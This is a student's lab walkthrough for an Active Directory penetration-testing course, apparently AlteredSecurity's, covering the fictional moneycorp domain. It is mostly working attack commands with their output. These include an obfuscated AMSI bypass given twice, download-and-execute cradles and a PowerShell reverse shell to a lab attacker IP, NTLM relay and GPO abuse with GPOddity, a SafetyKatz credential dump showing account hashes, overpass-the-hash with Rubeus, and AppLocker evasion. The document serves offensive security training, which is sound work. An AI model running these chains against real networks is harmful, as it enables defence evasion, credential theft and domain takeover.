## Summary
0. Instructions
   - AMSI Bypass
   - Invisi-Shell
   - Turn-off Firewall
1. [Objective 1](#objective-1)
    - Users
    - Computers
    - Domain Administrators
    - Enterprise Administrators
    - Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
    - Find a file share where studentx has Write permissions
2. [Objective 2](#objective-2)
    - ACL for the Domain Admins group
    - ACLs where studentx has interesting permissions
    - Analyze the permissions for studentx in BloodHound UI

## Instructions
* All commands is running by PowerView
* Please remember to turn-off or add an exception to your student VMs firewall when your run listener for a reverse shell
* Using Invisi-Shell to avoid enhanced logging
* AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Objective 1
```
Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
• Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
• Find a file share where studentx has Write permissions.
```
### Invisi-Shell
* C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

### Import PowerView
* C:\AD\Tools> . .\PowerView.ps1

### Return all users or specific user objects in AD
* Get-DomainUser
* Get-DomainUser | select -ExpandProperty samaccountname

### Member computers
* Get-DomainComputer | select -ExpandProperty dnshostname
```
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
```

### Details of the Domain Admins group 
* Get-DomainGroup -Identity "Domain Admins"

### Enumerate members of the Domain Admins group
* Get-DomainGroupMember -Identity "Domain Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins"
* Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local

### BloodHound ingestores
* C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL Container,ObjectProps,SPNTargets --excludedcs

### File with all servers
* Get-DomainComputer | select -ExpandProperty cn | Out-File -FilePath .\servers.txt
* cat C:\AD\Tools\servers.txt 
```
DCORP-ADMINSRV 
DCORP-APPSRV 
DCORP-CI 
DCORP-MGMT 
DCORP-MSSQL 
DCORP-SQL1
DCORP-STDADMIN
DCORP-STD2
DCORP-STUDENT1
```

### File share where studentx has Write permissions, Use the PowerHuntShares to search for file shares.
* Import-Module C:\AD\Tools\PowerHuntShares.psm1
* Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt
```
with the top 200 share names.
[*][12/24/2024 04:02] - 2 ADMIN$
[*][12/24/2024 04:02] - 2 C$
[*][12/24/2024 04:02] - 1 studentshare2
[*][12/24/2024 04:02] - 1 AI
[*] -----------------------------------------------
[*][12/24/2024 04:02] - Generating HTML Report
[*][12/24/2024 04:02] - Estimated generation time: 1 minute or less
[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```

![alt text](image-6.png)

![alt text](image-7.png)

## Objective 2:
```
• Enumerate following for the dollarcorp domain:
− ACL for the Domain Admins group
− ACLs where studentx has interesting permissions
• Analyze the permissions for studentx in BloodHound UI
```

### Enumerate ACLs for the Domain Admins Group
* Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

### Check for modify rights/permissions
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
* Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
ObjectDN : 
CN=ControlxUser,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier : AccessAllowed
ActiveDirectoryRights : GenericAll
ObjectAceType : None
AceFlags : None
AceType : AccessAllowed
InheritanceFlags : None
SecurityIdentifier : S-1-5-21-719815819-3726368948-3917688648-1123
IdentityReferenceName : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN : CN=RDP 
Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass : group
```

### Analyze the permissions for studentx using BloodHound UI
### Let’s look at the 'Outbound Object Control' for the studentx
```
Multiple permissions stand out in the above diagram. Due to the membership of the RDPUsers group, 
the studentx user has following interesting permissions
- Full Control/Generic All over supportx and controlx users. 
- Enrollment permissions on multiple certificate templates.
- Full Control/Generic All on the Applocked Group Policy.
```

![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)

## Objective 3
```
• Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the DevOps OU
− List the GPOs 
− Enumerate GPO applied on the DevOps OU
− Enumerate ACLs for the Applocked and DevOps GPOs
```

### List all the OUs
* Get-DomainOU
* Get-DomainOU | select -ExpandProperty name
```
Domain Controllers
StudentMachines
Applocked
Servers
DevOps
```

### List all the computers in the DevOps OU
* (Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
name
----
DCORP-CI
```

### List all the computers in the Applocked OU
* (Get-DomainOU -Identity Applocked).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
name
----
DCORP-ADMINSRV
```

### List all the GPOs
* Get-DomainGPO
```
flags : 0
systemflags : -1946157056
displayname : Default Domain Policy
[snip]
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

### Enumerate GPO applied on the DevOps OU (we need the name of the policy from the gplink attribute from the OU)
* (Get-DomainOU -Identity DevOps).gplink
```
LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

### More informations about this GPO
* Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```
flags : 0
displayname : DevOps Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-
3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged : 12/19/2024 12:00:15 PM
versionnumber : 3
name : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
cn : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
usnchanged : 314489
dscorepropagationdata : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
objectguid : fc0df125-5e26-4794-93c7-e60c6eecb75f
gpcfilesyspath : 
\\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8
D01C-1F62-4BDC-958C-57140B67D147}
distinguishedname : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated : 12/18/2024 7:31:22 AM
showinadvancedviewonly : True
usncreated : 293100
gpcfunctionalityversion : 2
instancetype : 4
objectclass : {top, container, groupPolicyContainer}
objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

### To enumerate the ACLs for the Applocked and DevOps GPO, let's use the BloodHound CE UI
![alt text](image-3.png)
![alt text](image-5.png)

**A user named 'devopsadmin' has 'WriteDACL' on DevOps Policy.**

## Objective 4
```
• Enumerate all domains in the moneycorp.local forest. 
• Map the trusts of the dollarcorp.moneycorp.local domain.
• Map External trusts in moneycorp.local forest. 
• Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
```

### Enumerate all domains in the current forest
* Get-ForestDomain -Verbose

### Map all the trusts of the dollarcorp domain
* Get-DomainTrust
```
SourceName : dollarcorp.moneycorp.local
TargetName : moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 5:59:01 AM
WhenChanged : 2/24/2023 9:11:33 AM

SourceName : dollarcorp.moneycorp.local
TargetName : us.dollarcorp.moneycorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 6:22:51 AM
WhenChanged : 2/24/2023 9:09:58 AM

SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### list only the external trusts in the moneycorp.local forest
<p> * Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"} </p>

```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

### Identify external trusts of the dollarcorp domain
*  Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```
SourceName : dollarcorp.moneycorp.local
TargetName : eurocorp.local
TrustType : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FILTER_SIDS
TrustDirection : Bidirectional
WhenCreated : 11/12/2022 8:15:23 AM
WhenChanged : 2/24/2023 9:10:52 AM
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
* Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}


## Objective 5
```
• Exploit a service on dcorp-studentx and elevate privileges to local administrator. 
• Identify a machine in the domain where studentx has local administrative access.
• Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
```

### Local Privilege Escalation - PowerUp
**We can use Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS**

* . C:\AD\Tools\PowerUp.ps1
* Invoke-AllChecks
```
[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
ModifiablePath : @{ModifiablePath=C:\WebServer; 
IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AbyssWebServer' -Path 
<HijackPath>
CanRestart : True
[snip]

[*] Checking service executable and argument permissions...
ServiceName : AbyssWebServer
AlteredSecurity Attacking and Defending Active Directory 35
Path : C:\WebServer\Abyss Web Server\abyssws.exe -
service
ModifiableFile : C:\WebServer\Abyss Web Server
ModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes, 
Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName : LocalSystem
AbuseFunction : Install-ServiceBinary -Name 
'AbyssWebServer'
CanRestart : True

[snip]
[*] Checking service permissions...
ServiceName : AbyssWebServer
Path : C:\WebServer\Abyss Web Server\abyssws.exe -service
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'AbyssWebServer'
CanRestart : True
```

### Abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group

*  Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student731' -Verbose
```
VERBOSE: Service 'AbyssWebServer' original path: 'C:\WebServer\Abyss Web Server\abyssws.exe -service'
VERBOSE: Service 'AbyssWebServer' original state: 'Stopped'
VERBOSE: Executing command 'net localgroup Administrators dcorp\student1 /add'
VERBOSE: binPath for AbyssWebServer successfully set to 'net localgroup Administrators dcorp\studentx /add'
```

* net localgroup Administrators
```
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
dcorp\Domain Admins
dcorp\student731
The command completed successfully.
```

**We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!**

### Hunt for Local Admin access

**To identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1**

* . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

**Studentx has administrative access on dcorp-adminsrv and on the student machine.** 
**We can connect to dcorp-adminsrv using winrs as the student user**

* winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
```

* set username
```
set username
USERNAME=studentx
```

* set computername
```
computername
COMPUTERNAME=dcorp-adminsrv
```

**PowerShell Remoting**
* Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

* [dcorp-adminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents>$env:username
```
dcorp\studentx
```

## Abuse Jenkins Instance
**We have a misconfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080)**
**Use the encodedcomand parameter of PowerShell to use an encoded reverse shell or use download execute cradle in Jenkins build step.**

### First, You need scan the networks

**On linux VM, run nmap scan**

* nmap -Pn -vvv 172.16.4.0/24 --min-rate=1000
* nmap -Pn -vvv 172.16.3.0/24 --min-rate=1000
```
Nmap scan report for 172.16.3.11
Host is up, received user-set (0.23s latency).
Scanned at 2025-09-22 12:19:29 EDT for 127s
Not shown: 719 closed tcp ports (reset), 276 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
8080/tcp open  http-proxy   syn-ack ttl 127


Nmap scan report for 172.16.3.81
Host is up, received user-set (0.26s latency).
Scanned at 2025-09-22 12:21:40 EDT for 130s
Not shown: 706 closed tcp ports (reset), 289 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
1433/tcp open  ms-sql-s     syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127


Nmap scan report for 172.16.4.217
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-22 12:38:29 EDT for 130s
Not shown: 709 closed tcp ports (reset), 288 filtered tcp ports (no-response)
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127


Nmap scan report for 172.16.4.101
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-22 12:34:09 EDT for 131s
Not shown: 706 closed tcp ports (reset), 290 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127


Nmap scan report for 172.16.4.44
Host is up, received user-set (0.40s latency).
Scanned at 2025-09-22 12:31:58 EDT for 131s
Not shown: 714 closed tcp ports (reset), 282 filtered tcp ports (no-response)
PORT     STATE SERVICE      REASON
135/tcp  open  msrpc        syn-ack ttl 127
139/tcp  open  netbios-ssn  syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
1433/tcp open  ms-sql-s     syn-ack ttl 127
```

**Manually trying the usernames as passwords we can identify that the user builduser has password builduser.**

![alt text](image-48.png)

* powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443

**make sure to add an exception or turn off the firewall on the student VM.**
**You can find hfs.exe in the C:\AD\Tools directory of your student VM. Note that HFS goes in the system tray when minimized**

* C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

![alt text](image-11.png)

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

![alt text](image-12.png)

* PS C:\Users\Administrator\.jenkins\workspace\Project0> $env:username
```
Ciadmin
```
* PS C:\Users\Administrator\.jenkins\workspace\Project0>$env:computername

## Objective 6
```
Abuse an overly permissive Group Policy to add studentx to the local administrators group on dcorp-ci.
```

### In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access Looking at the directory (\\\dcorp-ci\AI), we will find a log file

![alt text](image-13.png)

![alt text](image-14.png)

### It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity

### First, we will use ntlmrelayx tool from Ubuntu WSL instance on the student VM to relay the credentials of the devopsadmin user.

* Use WSLToTh3Rescue! as the sudo password.

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server

![alt text](image-15.png)

### On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. 
### Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:

* C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke_WebRequest -Uri 'http://172.16.100.31' -UseDefaultCredentials"

![alt text](image-16.png)

![alt text](image-17.png)

**Copy shortcut to dcorp-ci**

* C:\AD\Tools>xcopy C:\AD\Tools\studentx.lnk \\\dcorp-ci\AI

### Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> nc 127.0.0.1 11000

![alt text](image-18.png)

![alt text](image-19.png)

### Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

* Get-DomainGPO | select displayname, name

![alt text](image-20.png)

![alt text](image-21.png)

![alt text](image-22.png)

* write_gpo_dacl student731 {0BF8D01C-1F62-4BDC-958C-57140B67D147}

![alt text](image-23.png)

### Now, run the GPOddity command to create the new template.

* wsluser@dcorp-studentx:/mnt/c/Users/studentx$> cd /mnt/c/AD/Tools/GPOddity

```
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student731' --password 'rMszB5MwUBww29' --command 'net localgroup administrators student731 /add' --rogue-smbserver-ip '172.16.100.31' --rogue-smbserver-share 'std731-gp' --dc-ip '172.16.2.1' --smb-mode none
```

![alt text](image-24.png)


### Another Ubuntu WSL session, create and share the stdx-gp directory

* wsluser@dcorp-std731:/mnt/c/Users/student731$> mkdir /mnt/c/AD/Tools/std731-gp 
* wsluser@dcorp-std731:/mnt/c/Users/student731$> cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std731-gp

### From a command prompt (Run as Administrator) on the student VM, run the following commands to allow 'Everyone' full permission on the stdx-gp share

* C:\Windows\system32>net share stdx-gp=C:\AD\Tools\std731-gp
* icacls "C:\AD\Tools\std731-gp" /grant Everyone:F /T

**icacls Displays or modifies discretionary access control lists (DACLs) on specified files and applies stored DACLs to files in specified directories**

![alt text](image-25.png)

### Verify if the gPCfileSysPath has been modified for the DevOps Policy.

* Get-DomainGPO -Identity 'DevOps Policy'

### Before
![alt text](image-26.png)

### After
![alt text](image-27.png)

**After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci**

* C:\AD\Tools>winrs -r:dcorp-ci cmd /c "set computername && set username"
```
COMPUTERNAME=DCORP-CI
USERNAME=student731
```

* winrs -r:dcorp-ci cmd

![alt text](image-28.png)

## Objective 7
```
Identify a machine in the target domain where a Domain Admin session is available. 
• Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on 
dcorp-ci.
• Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using: 
− Gaps in Applocker rules. 
− Disable Applocker by modifying GPO applicable to dcorp-adminsrv
```

### Identify a machine where Domain Admin session is available
**We have access to two domain users - student731 and ciadmin and administrative access to dcorp-adminsrv machine. User hunting has not been fruitful as student731**

### Enumeration using Invoke-SessionHunter to list sessions on all the remote machines
* . C:\AD\Tools\Invoke-SessionHunter.ps1
* Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
[+] Elapsed time: 0:0:51.674
HostName UserSession Access
-------- ----------- ------
dcorp-appsrv    dcorp\appadmin      False
dcorp-ci        dcorp\ciadmin       False
dcorp-mgmt      dcorp\mgmtadmin     False
dcorp-mssql     dcorp\sqladmin      False
dcorp-dc        dcorp\Administrator False
dcorp-mgmt      dcorp\svcadmin      False
dcorp-adminsrv  dcorp\appadmin      True
dcorp-adminsrv  dcorp\srvadmin      True
dcorp-adminsrv  dcorp\websvc        True
```

* Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access

**There is a domain admin (svcadmin) session on dcorp-mgmt server! We do not have access to the server but that comes late**

![alt text](image-29.png)

### We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.
**We can use Powerview’s Find-DomainUserLocation on the reverse shell to looks for machines where a domain admin is logged in. First, we must bypass AMSI and enhanced logging**

* PS C:\Users\Administrator\.jenkins\workspace\Project731> iex (iwr http://172.16.100.31/sbloggingbypass.txt -UseBasicParsing)

### bypass AMSI
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

![alt text](image-30.png)

**Now, download and execute PowerView in memory of the reverse shell and run Find-DomainUserLocation. Check all the machines in the domain**

* iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.31/PowerView.ps1'))
* Find-DomainUserLocation

![alt text](image-32.png)

**There is a domain admin session on dcorp-mgmt server**

![alt text](image-49.png)

**Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open**

* PS C:\Users\Administrator\.jenkins\workspace\Project731> winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```
COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin`
```

**We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to  copy Loader.exe on dcorp-mgmt Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt**

* PS C:\Users\Administrator\.jenkins\workspace\Project731>iwr http://172.16.100.31/Loader.exe -OutFile C:\Users\Public\Loader.exe

**Now, copy the Loader.exe to dcorp-mgmt**
* PS C:\Users\Administrator\.jenkins\workspace\Project731> echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```
Does \\dcorp-mgmt\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
AlteredSecurity Attacking and Defending Active Directory 50
(F = file, D = directory)? F
C:\Users\Public\Loader.exe
1 File(s) copied
```

**Add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt**
* PS C:\Users\Administrator\.jenkins\workspace\Project731> $null | winrs - r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"

**To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader**

* PS C:\Users\Administrator\.jenkins\workspace\Project731> $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```
[snip]
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 12/5/2024 2:01:15 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
 * Key List :
 aes256_hmac 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old b38ff50264b74508085d82c69794a4d8
 rc4_md4 b38ff50264b74508085d82c69794a4d8
 rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8
```

![alt text](image-33.png)

![alt text](image-34.png)

```
[snip]
Authentication Id : 0 ; 58866 (00000000:0000e5f2)
Session : Service from 0
User Name : svcadmin
Domain : dcorp
Logon Server : DCORP-DC
Logon Time : 12/5/2024 2:01:15 AM
SID : S-1-5-21-719815819-3726368948-3917688648-1118
 * Username : svcadmin
 * Domain : DOLLARCORP.MONEYCORP.LOCAL
 * Password : (null)
 * Key List :
 aes256_hmac 
6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
 rc4_hmac_nt b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old b38ff50264b74508085d82c69794a4d8
 rc4_md4 b38ff50264b74508085d82c69794a4d8
 rc4_hmac_nt_exp b38ff50264b74508085d82c69794a4d8
 rc4_hmac_old_exp b38ff50264b74508085d82c69794a4d8

```

**We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see "Session" in the above output), so you can even get credentials in clear-text from lsasecrets**

### Find the proccess is using svcadmin account.
* $null | winrs -r:dcorp-mgmt "cmd /c tasklist /V | findstr "svcadmin"

![alt text](image-35.png)

### OverPass-the-Hash to replay svcadmin credentials
**use OverPass-the-Hash to use svcadmin's credentials**

**Run the commands below from an elevated shell on the student VM to use Rubeus**

* C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

![alt text](image-36.png)

### Try accessing the domain controller from the new process
* C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username
```
USERNAME=svcadmin`
```

![alt text](image-37.png)

**Note that we did not need to have direct access to dcorp-mgmt from the student VM.**

### Abuse Derivative Local Admin
**We need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges**

* PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
```
dcorp-adminsrv
```

### Gaps in Applocker Policy

**Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute**

* C:\AD\Tools>winrs -r:dcorp-adminsrv cmd
```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.
```

* C:\Users\student731> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
```

**We can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else**

![alt text](image-38.png)

**However, this particular rule is overly permissive**

